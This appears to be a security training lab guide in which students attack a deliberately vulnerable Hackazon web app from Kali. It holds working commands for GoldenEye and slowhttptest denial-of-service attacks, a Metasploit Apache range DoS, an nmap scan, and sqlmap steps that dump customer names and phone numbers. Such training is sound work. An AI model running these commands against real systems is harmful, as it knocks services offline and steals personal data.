Attack a Web App
=========================================

.. toctree::
   :maxdepth: 2
   :hidden:
   :glob:

   lab*

* Objectives

-  Perform L7 attacks against unprotected Web App

-  Estimated Time for completion: 45 minutes

-  (Optional) Attack via Metasploit

-  Tasks in red performed on Kali host

-  Tasks in blue performed on Hackazon

#. Open a putty session to the Kali server and Hackazon server

#. Verify site availability and capture server stats

   * Browse http://hackazon.f5agility.com

   * (Hackazon) View server base stats

      #.   # free -m

      #.  # pgrep httpd \| wc -l

      #. # top

   * Open BIG-IP Dashboard

#. Attack via GoldenEye

   * (Kali) Browse to GoldenEye directory and execute attack.

      #.  cd /root/Agility/GoldenEye

      #. ./goldeneye.py http://hackazon.f5agility.com -d -w 50 -s 200

   * Is site available?  http://hackazon.f5agility.com

   * (Hackazon) Observe impact

      #.  # top

      #. # free -m

   * (Kali) Stop attack <Ctrl>+C

#. Verify test site availability

   * http://hackazon.f5agility.com

   * If site unavailable, restart web service on Hackazon host

      # /etc/init.d/apache2 restart

#. Attack via SLOWHTTPTEST

   * (Kali) Browse to slowhttptest directory and execute attack

      #.  cd /root/Agility/slowhttptest
 
      #. slowhttptest -c 1000 -H -g -o slowloris\_stats\_lab1 -i 10 -r 200 -s 8192 -t GET -u http://hackazon.f5agility.com -x 24 -p 3

         .. image:: /_static/class3/image8.png

   * Is site available?

   * (Hackazon) Observe impact

      #. top

      #. free -m

   * (Kali) Stop Attack *<Ctrl>+C*

   * (Hackazon) Restart web services *# /etc/init.d/httpd restart*

#. Attack via SQLMap

   * To begin we’ll need to browse the site for a URL that looks
      injectable, like this one:

       http://hackazon.f5agility.com/product/view?id=51

   * (Kali) Determine database type

      #. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 --dbs
    
         .. image:: /_static/class3/image9.png

      #.  Select ‘C’

      #. DB identified as ‘MySQL’, Select ‘Y’, then ‘Y’
      
         .. image:: /_static/class3/image10.png

   * (Kali) Determine Table Names

      #. Choose a discovered Database and query for table

         .. image:: /_static/class3/image11.png

      #. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 -D hackazon --tables

         .. image:: /_static/class3/image12.png

   * Now for the columns

      #. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 -D hackazon -T tbl\_customer\_address --columns

         .. image:: /_static/class3/image13.png

         And finally…lets extract some data

      #. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 -D hackazon -T tbl\_customer\_address -C full\_name,phone,zip --dump

   * Did these attacks bring the site offfline?

#. (Optional) Attack via Metasploit

   * (Kali) Open Metasploit console *msfconsole*

   * (Kali) Port scan the vulnerable host *msf > nmap -sS -A hackazon.f5agility.com*

    .. image:: /_static/class3/image14.png

   *  Search for an exploit

      #. Take information provided above and find an exploit/CVE!

   * (Kali) Configure exploit (example)

      #.   msf > use auxiliary/dos/http/apache\_range\_dos

      #.  msf auxiliary(apache\_range\_dos) > show options

      #. set RHOSTS 10.128.20.210

   * (Kali) Attack!

      msf > run

   * Is site available?

   * (Hackazon) Observe impact

      #.  # top

      #. # free –m

   * Stop attack

   * run the command *# /etc/init.d/httpd restart*
